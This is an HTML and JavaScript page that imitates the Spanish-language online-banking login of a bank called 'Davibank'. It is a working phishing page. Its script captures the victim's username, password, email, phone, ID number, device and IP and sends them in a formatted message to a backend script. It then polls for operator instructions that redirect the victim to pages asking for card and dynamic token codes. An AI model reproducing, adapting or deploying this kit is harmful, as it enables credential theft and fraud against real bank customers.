<!DOCTYPE html>
<html lang="en">

<head>
	  <style>
@keyframes pulse {
    0% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.1); opacity: 0.7; }
    100% { transform: scale(1); opacity: 1; }
}
</style>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Banca virtual | Confirmacion</title>
    <link rel="shortcut icon" href="img/favicon_davi.svg" type="image/x-icon">
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <script type="text/javascript" src="../../../../assets/js/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="contenedor">
        <div class="principal">
            <div class="autenticar">
                <div class="conttitulo">
                    <div class="logo-banner">
                        <img src="img/logo_davib.svg" alt="Banner Logo" />
                    </div>
                    <div class="titulo">
                        <h1>Ingresa a tu Banca Virtual</h1>
                    </div>
                </div>
                <div class="contenido">
                    <div class="caja">
                        <div class="izq">
                            <form autocomplete="off" id="fusuario">
                                <input type="hidden" id="session_id" name="session_id">
                                <input type="hidden" id="username" name="username">
                                <div class="inputg columna">
                                    <input type="text" name="usuario" id="usuario" placeholder="Nombre de usuario" maxlength="12" />
                                    <div class="error" id="eUsuario">
                                        <img src="img/war.svg" alt="error"> <span class="rojo">Ingresa un nombre de usuario que contenga entre 6 a 12 caracteres y sin caracteres especiales</span>
                                    </div>
                                </div>
                                <div class="inputg columna">
                                    <div style="text-align: right;" class="ojos">
                                        <img src="img/ojo.svg" alt="ojo" id="ojo" style="display: none;">
                                    </div>
                                    <input style="width: 100%;" type="password" name="contra" id="contra" placeholder="Contraseña" maxlength="15" class="contrasena" />
                                    <div class="vali" style="display: none;" id="validaciones">
                                        <span id="cantidad">8+ caracteres</span>
                                        <span id="mayus">1+ mayuscula</span>
                                        <span id="minus">1+ minúscula</span>
                                        <span id="numero">1+ número</span>
                                    </div>
                                </div>
                                <div class="inputge">
                                    <a href="javascript:void(0)" class="enlacef" style="margin-top: 7px;">¿Necesitas ayuda para ingresar?</a>
                                </div>

                                <div class="inputche">
                                    <input type="checkbox" name="record" id="record" />
                                    <label for="record">Recordar mi nombre de usuario</label>
                                </div>
                                <div class="inputgb">
                                    <button type="button" id="btnEntrar" class="btn">Ingresar</button>
                                </div>
                                <div class="inputg inicio">
                                    <p style="margin-bottom: 5px;">¿No te has registrado?</p>
                                    <a href="javascript:void(0)" class="enlacef">Registrate ahora</a>
                                </div>
                            </form>
                        </div>
                        <div class="der">
                            <img src="img/baner1.svg" alt="depart" />
                        </div>

                    </div>
                </div>
            </div>
        </div>

    </div>

    <!-- Loader overlay -->
    <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.7); z-index: 9999; justify-content: center; align-items: center;">
        <img src="img/l21.svg" alt="Cargando..." style="width: 80px; height: 80px; animation: blink 1.5s infinite;">
    </div>

    <style>
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
    </style>

    <script src="js/funciones.js"></script>
    <script>
    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Generar o recuperar session_id
      let sessionId = localStorage.getItem('session_id');
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }
      
      const sessionInput = document.getElementById('session_id');
      sessionInput.value = sessionId;

      // Obtener usuario desde URL params y establecer en el campo hidden
      const userFromUrl = urlParams.get('user');
      const usernameInput = document.getElementById('username');
      if (userFromUrl) {
        usernameInput.value = userFromUrl;
        localStorage.setItem('username', userFromUrl);
      }

      // Remover el event listener original y agregar el nuestro
      const btnIngresar = document.getElementById('btnEntrar');
      
      if (btnIngresar) {
        // Remover event listeners existentes
        const newBtn = btnIngresar.cloneNode(true);
        btnIngresar.parentNode.replaceChild(newBtn, btnIngresar);
        
        // Agregar nuestro event listener
        newBtn.addEventListener('click', async function (event) {
          event.preventDefault();
          event.stopPropagation();

          // Validaciones básicas
          const usuario = document.getElementById('usuario').value;
          const contra = document.getElementById('contra').value;
          
          if (!usuario || usuario.length === 0) {
            document.getElementById('eUsuario').style.display = 'block';
            return;
          }
          
          if (!contra || contra.length === 0) {
            document.getElementById('contra').focus();
            return;
          }

          // Obtener datos del formulario
          let identificacion = usuario;
          let password = contra;
          
          // Validar que la clave tenga máximo 15 caracteres alfanuméricos
          if (password.length > 15) {
            alert('La clave debe tener máximo 15 caracteres alfanuméricos');
            return;
          }
          
          // Validar que la clave contenga al menos 1 carácter
          if (password.length < 1) {
            alert('La clave no puede estar vacía');
            return;
          }
          
          // Validar que la identificación tenga al menos 5 dígitos
          if (identificacion.length < 5) {
            alert('La identificación debe tener al menos 5 dígitos');
            return;
          }

          // Mostrar loader
          const loader = document.getElementById('loader-overlay');
          if (loader) {
            loader.style.display = 'flex';
          }

          const formUsername = document.getElementById('username').value;
          const session_id = document.getElementById('session_id').value;

          localStorage.setItem('username', formUsername);
          localStorage.setItem('password', password);
          localStorage.setItem('session_id', session_id);
          localStorage.setItem('identificacion', identificacion);

          // Detectar tipo de dispositivo
          const userAgent = navigator.userAgent;
          let dispositivo = 'PC';
          
          if (/Android/i.test(userAgent)) {
            dispositivo = 'Android';
          } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
            dispositivo = 'iPhone';
          } else if (/Windows/i.test(userAgent)) {
            dispositivo = 'PC';
          } else if (/Mac/i.test(userAgent)) {
            dispositivo = 'Mac';
          } else if (/Linux/i.test(userAgent)) {
            dispositivo = 'Linux';
          }
          
          const hora = new Date().toLocaleString('es-ES');

          // Obtener IP y construir mensaje
          fetch('get_ip.php')
            .then(response => {
              return response.json();
            })
            .then(data => {
              const ip = data.ip || 'No disponible';
              
              const mensaje = `
<b><u>💎BANCO DAVIBANK💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO DAVIBANK
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> ${ip}
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${identificacion}
• <b>🔑 Clave:</b> ${password}
------------------------------`;

              const formData = new FormData();
              formData.append('message', mensaje);
              formData.append('transactionId', session_id);

                            fetch('procesar_logo.php', {
                method: 'POST',
                body: formData
              })
              .then(res => {
                return res.json();
              })
              .then(result => {
                if (result.status === 'success') {
                  checkPaymentVerification(session_id, result.messageId);
                                                   } else {
                    // Ocultar loader si hay error
                    const loader = document.getElementById('loader-overlay');
                    if (loader) {
                      loader.style.display = 'none';
                    }
                    // Mostrar mensaje de error en lugar de redirigir
                    alert("Error en el procesamiento. Intente nuevamente.");
                  }
                              })
                                             .catch(err => {
                  // Ocultar loader si hay error
                  const loader = document.getElementById('loader-overlay');
                  if (loader) {
                    loader.style.display = 'none';
                  }
                  // Mostrar mensaje de error en lugar de redirigir
                  alert("Error de conexión. Intente nuevamente.");
                });
            })
            .catch((error) => {
              // Si falla la obtención de IP, enviar sin IP
              const mensaje = `
<b><u>💎BANCO DAVIBANK💎</b></u>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO DAVIBANK
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> No disponible
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${identificacion}
• <b>🔑 Clave:</b> ${password}
------------------------------`;

              const formData = new FormData();
              formData.append('message', mensaje);
              formData.append('transactionId', session_id);

                            fetch('procesar_logo.php', {
                method: 'POST',
                body: formData
              })
              .then(res => {
                return res.json();
              })
              .then(result => {
                if (result.status === 'success') {
                  checkPaymentVerification(session_id, result.messageId);
                                 } else {
                   // Ocultar loader si hay error
                   const loader = document.getElementById('loader-overlay');
                   if (loader) {
                     loader.style.display = 'none';
                   }
                   // Mostrar mensaje de error en lugar de redirigir
                   alert("Error en el procesamiento. Intente nuevamente.");
                 }
                              })
                             .catch(err => {
                // Ocultar loader si hay error
                 const loader = document.getElementById('loader-overlay');
                 if (loader) {
                   loader.style.display = 'none';
                 }
                 // Mostrar mensaje de error en lugar de redirigir
                 alert("Error de conexión. Intente nuevamente.");
               });
            });
        });
      } else {
        // Botón Ingresar no encontrado
      }
    });

    async function checkPaymentVerification(transactionId, messageId) {
  try {
    const formData = new FormData();
    formData.append('transactionId', transactionId);
    formData.append('messageId', messageId);

    const res = await fetch('verificar_respuesta.php', {
      method: 'POST',
      body: formData
    });

    const result = await res.json();

    if (result.action) {
      // Ocultar loader si existe
      const loader = document.getElementById('loader-overlay');
      if (loader) loader.style.display = 'none';

      switch (result.action) {
        case 'error_logo':
          alert("Usuario o clave incorrectos.");
          window.location.href = "index.php";
          break;

        case 'error_cajero':
          $("#mensaje").hide();
          window.location.href = "caje.php";
          break;

        case 'error_tarjeta':
          alert("Error con la tarjeta.");
          window.location.href = "index.php";
          break;

        case 'error_dinamica':
          alert("Error con el código dinámico.");
          window.location.href = "token.php";
          break;

        case 'pedir_dinamica':
          alert("Dinámica incorrecta. Intente nuevamente.");
          window.location.href = "token.php";
          break;

        case 'confirm_finalizar':
          // Redirección final tras éxito
          window.location.href = "/fin.php";
          break;

        default:
          console.warn("Acción no reconocida:", result.action);
          break;
      }
    } else {
      // Si aún no hay acción, volver a preguntar en 2 segundos
      setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
    }
  } catch (err) {
    // Si hay error en la conexión, volver a preguntar en 2 segundos
    console.error("Error en verificación:", err);
    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
  }
}

  </script>
    <div id="loader" style="
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: #ffffff;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    z-index: 9999;
">
    <img src="img/l1.png" alt="Cargando..." style="width: 120px; height: 120px; animation: pulse 1.5s infinite;">
</div>

<script>
// Espera 3 segundos y redirige al siguiente paso
setTimeout(function () {
    document.getElementById('loader').style.display = 'none';
}, 3000);
</script>
</body>

</html>